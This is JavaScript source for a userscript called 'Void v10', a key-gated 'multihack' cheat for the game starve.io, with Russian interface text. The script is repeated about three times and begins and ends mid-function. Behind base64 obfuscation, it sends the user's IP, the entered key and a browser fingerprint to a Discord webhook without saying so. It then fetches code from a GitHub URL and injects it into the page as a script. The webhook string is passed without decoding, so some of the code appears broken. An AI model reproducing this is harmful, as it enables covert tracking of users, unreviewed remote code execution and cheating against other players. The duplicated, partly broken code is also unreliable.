                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
